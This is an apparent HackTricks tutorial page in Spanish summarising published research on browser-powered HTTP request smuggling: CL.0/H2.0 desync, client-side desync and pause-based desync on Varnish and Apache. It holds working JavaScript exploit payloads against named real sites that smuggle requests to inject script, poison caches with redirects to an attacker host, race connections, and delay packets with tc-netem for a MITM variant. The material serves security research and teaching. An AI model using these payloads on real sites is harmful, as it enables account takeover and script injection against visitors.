# Browser HTTP Request Smuggling

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
## Desincronizaci√≥n compatible con navegadores CL.0/H2.0

Esta vulnerabilidad ocurre cuando el encabezado **Content Length** (CL) es completamente **ignorado** por el **servidor backend**. Entonces, el backend trata el **cuerpo** como el **inicio del m√©todo de la segunda solicitud**. Ignorar el CL es equivalente a tratarlo como si tuviera un valor de 0, por lo que esto es una desincronizaci√≥n CL.0 - una clase de ataque [conocida](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) pero menos explorada.

![](<../../.gitbook/assets/image (3) (1) (2).png>)

El ataque fue posible porque el servidor backend simplemente **no esperaba una solicitud POST**.

{% hint style="warning" %}
Ten en cuenta que esta vulnerabilidad se **activa** por una solicitud HTTP **completamente v√°lida** y conforme a la especificaci√≥n. Esto significa que el **frontend no tiene ninguna posibilidad de protegerse** contra ella, e incluso podr√≠a ser activada por un navegador.
{% endhint %}

La √∫nica **diferencia** entre **CL.0** y **H2.0** es que el segundo est√° utilizando **HTTP2** (que tiene un encabezado de longitud de contenido impl√≠cito) pero el **backend tampoco est√° utilizando eso**.

## Desincronizaci√≥n del Lado del Cliente

Los ataques de desincronizaci√≥n tradicionales **envenenan** la **conexi√≥n** entre un servidor **frontend y backend**, y por lo tanto son imposibles en sitios web que no utilizan una arquitectura frontend/backend. A estos los llamaremos **desincronizaci√≥n del lado del servidor** de ahora en adelante. La mayor√≠a de las **desincronizaciones del lado del servidor** solo pueden ser activadas por un **cliente HTTP personalizado que emite una solicitud malformada.**

La capacidad de un **navegador para causar una desincronizaci√≥n** habilita una nueva clase de amenaza llamada **desincronizaci√≥n del lado del cliente** (CSD).\
Un ataque CSD comienza con la **v√≠ctima visitando el sitio web del atacante**, lo que luego hace que su navegador env√≠e **dos solicitudes entre dominios al sitio web vulnerable**. La **primera** solicitud est√° dise√±ada para **desincronizar la conexi√≥n del navegador** y hacer que la **segunda solicitud active** una respuesta perjudicial, t√≠picamente dando al atacante el control de la cuenta de la v√≠ctima.

### Detectar

Un vector CSD es una solicitud HTTP con **dos propiedades clave**.

Primero, el **servidor debe ignorar el Content-Length (CL) de la solicitud**. Esto t√≠picamente ocurre porque la solicitud **activ√≥ un error del servidor**, o el servidor simplemente **no esperaba una solicitud POST** al endpoint elegido. Intenta apuntar a **archivos est√°ticos** y **redirecciones a nivel de servidor**, y activar errores a trav√©s de **URLs demasiado largas**, y unas **semi-malformadas** como /%2e%2e.

En segundo lugar, la solicitud debe ser **activable en un navegador web entre dominios**. Los navegadores restringen severamente el control sobre las solicitudes entre dominios, por lo que tienes un control limitado sobre los encabezados, y si tu solicitud tiene un cuerpo necesitar√°s usar el m√©todo HTTP POST. En √∫ltima instancia, solo **controlas** la **URL**, adem√°s de algunos detalles como el encabezado **Referer**, el **cuerpo**, y la **parte final del Content-Type.**

#### Pruebas de ignorancia de CL

La forma de probar esta mala configuraci√≥n es **enviar 2 solicitudes y contrabandear una** en el **medio**. Si la conexi√≥n **contrabandeada** **afect√≥** la respuesta de la **segunda solicitud**, significa que es **vulnerable**:

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
Ten en cuenta que **no puedes** probar esta vulnerabilidad simplemente enviando un **Content-Length m√°s grande** que el enviado y **buscando un tiempo de espera** porque algunos servidores **responden** incluso si **no recibieron todo el cuerpo**.
{% endhint %}

Es importante notar si el **sitio web objetivo soporta HTTP**/2. Los ataques CSD t√≠picamente explotan la reutilizaci√≥n de conexiones HTTP/1.1 y los **navegadores prefieren usar HTTP/2** siempre que sea posible, as√≠ que si el sitio web objetivo **soporta HTTP/2 es poco probable que tus ataques funcionen**. Hay una **excepci√≥n**; algunos **proxies de reenv√≠o no soportan HTTP/2** por lo que puedes explotar a cualquiera que los use. Esto incluye proxies corporativos, ciertas VPNs intrusivas e incluso algunas herramientas de seguridad.

### Confirmar

Primero, selecciona un sitio desde el cual lanzar el ataque. Este sitio debe ser **accedido a trav√©s de HTTPS** y ubicado en un **dominio diferente al objetivo**.

Luego, aseg√∫rate de que **no tienes un proxy configurado**, y navega a tu sitio de ataque. Abre las **herramientas de desarrollador** y cambia a la pesta√±a **Red**. Para ayudar con la depuraci√≥n de problemas potenciales m√°s tarde, recomiendo hacer los siguientes ajustes:

* Selecciona la casilla **"Preservar registro"**.
* Haz clic derecho en los encabezados de las columnas y **activa la columna "ID de Conexi√≥n"**.

Cambia a la consola de desarrollador y ejecuta JavaScript para replicar tu secuencia de ataque usando fetch(). Esto puede verse algo as√≠ como:
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
### Explotaci√≥n - Almacenar

Una opci√≥n es identificar funcionalidades en el sitio objetivo que permitan **almacenar datos de texto**, y dise√±ar el prefijo de manera que las cookies de tu v√≠ctima, cabeceras de autenticaci√≥n o contrase√±as terminen siendo **almacenadas en alg√∫n lugar de donde puedas recuperarlas**. Este flujo de ataque funciona [casi id√©nticamente al contrabando de solicitudes del lado del servidor](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), as√≠ que no me extender√© en ello.

### Explotaci√≥n - **Cadena y pivote**

Bajo circunstancias normales, muchas clases de **ataques del lado del servidor** solo pueden ser lanzadas por un atacante con acceso directo al sitio objetivo ya que **dependen de solicitudes HTTP que los navegadores se niegan a enviar**, como **manipular** las **cabeceras HTTP** - envenenamiento de cach√© web, la mayor√≠a del contrabando de solicitudes del lado del servidor, ataques de cabecera de host, User-Agent basado en [SQLi](https://portswigger.net/web-security/sql-injection), CSRF JSON Content-type y muchos otros.

El camino m√°s simple hacia un ataque exitoso provino de dos t√©cnicas clave usualmente usadas para ataques de desincronizaci√≥n del lado del servidor: [**envenenamiento de recursos JavaScript a trav√©s de redirecciones de cabecera de Host**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), y usar el [**m√©todo HEAD**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) para unir una respuesta con HTML perjudicial. Ambas t√©cnicas necesitaban ser **adaptadas** para superar algunos desaf√≠os novedosos asociados con operar en el **navegador de la v√≠ctima**.

## Ejemplos de Explotaci√≥n

### Ejemplo de HEAD apilado

* **Explotaci√≥n coloreada**

![](<../../.gitbook/assets/image (2) (3).png>)

* **Explotaci√≥n JS**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
Explicaci√≥n:

* **Abuso de CL.0** en /assets (se redirige a /assets/ y no verifica el CL)
* **Contrabandear** una solicitud **HEAD** (porque las respuestas HEAD a√∫n contienen un content-length)
* **Contrabandear** una solicitud **GET** cuyo **contenido** va a ser **reflejado** en la respuesta con el payload.
* Debido al **content-length del HEAD** req, la **respuesta** de esta solicitud ser√° el **cuerpo del HEAD req**
* Establecer **modo cors**. Normalmente esto no se hace, pero en este caso la **respuesta** del servidor al **POST** **inicial** es una **redirecci√≥n** que si se **sigue** el **exploit no funcionar√°**. Por lo tanto, se utiliza el **modo cors** para **desencadenar** un **error** y **redirigir** a la v√≠ctima con el **`catch`**.

### **Redirecci√≥n del encabezado Host + envenenamiento de cach√© del lado del cliente**

* **Exploit JS**
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Una solicitud a `/+webvpn+/` con un **dominio diferente en el encabezado Host** se responde con un **redireccionamiento** a `/+webvpn+/index.html` hacia ese **dominio** dentro del encabezado Host.
* La ubicaci√≥n en la **segunda** solicitud se establece en `/+CSCOE+/win.js` para **envenenar** la **cach√©** de ese archivo `.js`.
* Esta solicitud se responder√° con el redireccionamiento de `/+webvpn+/` al dominio del atacante con la ruta `/+webvpn+/index.html`
* La **cach√©** de **`win.js`** ser√° **envenenada** con un **redireccionamiento** a la p√°gina del **atacante**, pero tambi√©n la **v√≠ctima** **seguir√°** el redireccionamiento ya que fue asignado en la variable `location` y terminar√° en la p√°gina web del atacante.
* El atacante luego **redireccionar√°** a la **v√≠ctima** a `https://redacted/+CSCOE+/logon.html`. Esta p√°gina importar√° `/+CSCOE+/win.js`. Cuya **cach√© es un redireccionamiento** al servidor del **atacante**, por lo tanto, el atacante puede **responder con un JS malicioso**.

La **v√≠ctima** **acceder√°** a la p√°gina del **atacante** **dos veces**, la primera espera un HTML que redirija a la v√≠ctima de vuelta a `https://redacted/+CSCOE+/logon.html` y la segunda espera c√≥digo javascript (el payload). Un pol√≠glota puede usarse para servir ambas respuestas en una sola:
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### Carga √∫til HEAD con TE fragmentado

Al buscar CSD tambi√©n puedes **probar URLs semi-malformadas** como `/..%2f` o `/%2f`.

* **Explotaci√≥n Coloreada**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **Explotaci√≥n JS**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* La p√°gina **`/%2f`** se accede para **explotar** la vulnerabilidad **CL.0**.
* Se realiza un contrabando de una solicitud **HEAD** utilizando un **`Transfer-Encoding: chunked` header**.
* Este encabezado es necesario en este escenario porque de lo contrario el **servidor se negaba a aceptar una solicitud HEAD con cuerpo**.
* Luego, el usuario env√≠a un POST cuyo cuerpo contiene el **final del chunk de la solicitud HEAD anterior** y una **nueva solicitud que se contrabandea** con **contenido** (el payload de JS) que se **reflejar√°** en la respuesta.
* Por lo tanto, el navegador tratar√° la **respuesta a la solicitud HEAD** como la **respuesta a la solicitud POST**, la cual tambi√©n **contendr√°** en la **respuesta del cuerpo** que **refleja** la **entrada** del usuario en la segunda solicitud contrabandeada.

### Redirecci√≥n del encabezado Host + RC

* **JS Exploit**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
En este caso, nuevamente, hay un **host header** **redirect** que podr√≠a usarse para **hijack** una importaci√≥n de **JS**. Sin embargo, esta vez el **redirect no es cacheable**, por lo que el envenenamiento del **cache** del lado del cliente no es una opci√≥n.

Por lo tanto, el ataque realizado har√° que el **v√≠ctima acceda a la p√°gina vulnerable** en una pesta√±a y luego, justo **antes** de que la p√°gina intente **cargar un archivo JS**, **envenenar** el socket **smuggling connections** (3 en este caso).\
Debido a que el **timing** debe ser extremadamente **preciso**, el ataque se realiza contra una **nueva pesta√±a en cada iteraci√≥n** hasta que funcione.

{% hint style="warning" %}
Ten en cuenta que en este caso se atac√≥ `/meeting_testjs.cgi` porque **carga** un **Javascript** que responde con un **404**, por lo que no est√° en cach√©. En otros escenarios donde intentes atacar un **JS que est√° en cach√©** necesitas esperar a que **desaparezca del cach√©** antes de lanzar un nuevo ataque.
{% endhint %}

Pasos resumidos:

* Abrir una nueva ventana.
* Emitir una solicitud inofensiva al objetivo para establecer una conexi√≥n nueva, haciendo que los tiempos sean m√°s consistentes.
* Navegar la ventana a la p√°gina objetivo en /meeting\_testjs.cgi.
* 120 ms despu√©s, crear tres conexiones envenenadas utilizando el gadget de redirecci√≥n.
* 5 ms despu√©s, mientras se renderiza /meeting\_testjs.cgi, la v√≠ctima intentar√°, con suerte, importar /appletRedirect.js y ser redirigida a x.psres.net, que sirve JS malicioso.
* Si no, reintentar el ataque.

## Desincronizaci√≥n basada en pausa <a href="#pause" id="pause"></a>

Pausar tambi√©n puede crear nuevas vulnerabilidades de desincronizaci√≥n al **activar implementaciones err√≥neas de tiempo de espera de solicitud**.

Entonces, un atacante podr√≠a enviar una solicitud con **encabezados que indican que hay un cuerpo**, y luego **esperar** a que el **front-end agote el tiempo de espera antes de enviar el cuerpo**. Si el front-end agota el tiempo pero **deja la conexi√≥n abierta**, el **cuerpo** de esa solicitud ser√° **tratado como una nueva solicitud**.

### Ejemplo: **Varnish**

Varnish cache tiene una caracter√≠stica llamada `synth()`, que te permite emitir una **respuesta sin reenviar** la solicitud al back-end. Aqu√≠ hay un ejemplo de regla que se utiliza para bloquear el acceso a una carpeta:
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
Al procesar una **solicitud parcial** que coincide con una regla sint√©tica, Varnish **se agotar√° el tiempo** si no recibe datos durante **15 segundos**. Cuando esto sucede, **deja la conexi√≥n abierta** para su reutilizaci√≥n aunque solo haya le√≠do la mitad de la solicitud del socket. Esto significa que si el **cliente contin√∫a con la segunda mitad** de la solicitud HTTP, ser√° interpretada como una **solicitud nueva**.

Para desencadenar un desincronizaci√≥n basada en pausa en un front-end vulnerable, comienza enviando tus encabezados, prometiendo un cuerpo, y luego espera. Eventualmente recibir√°s una respuesta y cuando finalmente env√≠es el cuerpo de tu solicitud, ser√° interpretado como una nueva solicitud:

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
Aparentemente esto fue parcheado el 25 de enero como [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html).
{% endhint %}

### Ejemplo: **Apache**

Al igual que Varnish, es vulnerable en **puntos finales donde el servidor genera la respuesta por s√≠ mismo** en lugar de permitir que la aplicaci√≥n maneje la solicitud. Una forma en que esto sucede es con redirecciones a nivel de servidor: `Redirect 301 / /en`

### Explotaci√≥n del lado del servidor <a href="#server" id="server"></a>

Si el servidor vulnerable (Apache o Varnish en este caso) est√° en el back-end, se necesita un **front-end** que **transmita la solicitud al servidor back-end** (encabezados http en este caso) **sin almacenar en b√∫fer** todo el cuerpo de la solicitud.

![](<../../.gitbook/assets/image (3) (3).png>)

En este caso, el atacante **no recibir√° el tiempo de espera de la respuesta hasta que haya enviado el cuerpo**. Pero si conoce el tiempo de espera, esto no deber√≠a ser un problema.

El Balanceador de Carga de Aplicaciones (ALB) de Amazon **transmitir√° los datos de la conexi√≥n seg√∫n sea necesario**, pero si **recibe** la **respuesta** a la media solicitud (el tiempo de espera) **antes** de recibir el **cuerpo**, **no enviar√° el cuerpo**, por lo que se debe explotar una **Condici√≥n de Carrera** aqu√≠:

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Hay una complicaci√≥n adicional cuando se trata de **explotar Apache detr√°s de ALB** - **ambos servidores** tienen un **tiempo de espera predeterminado de 60 segundos**. Esto deja una **ventana de tiempo extremadamente peque√±a** para enviar la segunda parte de la solicitud. El ataque de Condici√≥n de Carrera fue finalmente exitoso despu√©s de 66 horas.

### Explotaci√≥n MITM

Aparentemente, **no es posible detener una solicitud desde el navegador** para explotar una vulnerabilidad de desincronizaci√≥n por pausa. Sin embargo, siempre podr√≠as **realizar un ataque MITM para pausar una solicitud** enviada por el navegador. Ten en cuenta que este ataque **no depende de descifrar** ning√∫n tr√°fico.

El flujo del ataque es muy **similar a un ataque de desincronizaci√≥n del lado del cliente regular**. El usuario visita una p√°gina controlada por el atacante, que emite una serie de **solicitudes entre dominios** a la aplicaci√≥n objetivo. La **primera solicitud HTTP** se rellena deliberadamente para que sea tan **grande** que el sistema operativo **la divida en m√∫ltiples paquetes TCP**, permitiendo a un **MITM activo retrasar el paquete final**, desencadenando una desincronizaci√≥n basada en pausa. Debido al relleno, el **atacante** puede **identificar** qu√© **paquete pausar** simplemente bas√°ndose en el **tama√±o**.

Desde el lado del cliente parece un desincronizaci√≥n del lado del cliente regular usando el gadget HEAD, aparte del relleno de la solicitud:
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
En el sistema del atacante que realiza el MITM ciego, el retraso se implement√≥ utilizando tc-NetEm:
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **Referencias**

* Toda la informaci√≥n de esta publicaci√≥n fue tomada de [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
